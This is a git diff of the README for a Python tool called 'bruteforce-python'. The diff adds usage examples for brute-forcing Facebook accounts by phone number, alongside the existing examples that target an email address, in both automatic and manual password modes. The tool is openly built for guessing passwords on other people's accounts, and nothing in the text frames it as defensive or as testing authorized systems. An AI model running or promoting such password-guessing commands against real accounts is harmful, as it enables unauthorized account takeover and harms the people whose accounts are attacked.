@@ -7,12 +7,17 @@ git clone https://github.com/ferdiansyah0611/bruteforce-python
 #### Usage
 ```cli
 cd bruteforce-python
-# Show Help
+# Show Help (Include Argument)
 python app.py --h
 # Bruteforce Facebook
+# with email
 python app.py -e admin@server.com -c 1 -t a
 # or
 python app.py -e admin@server.com -c 1 -t m -p password12345
+# with phone
+python app.py -P 09999999999 -c 1 -t a
+# or
+python app.py -P 09999999999 -c 1 -t m -p password12345
 ```
 #### Requirement Module
 - Python v3
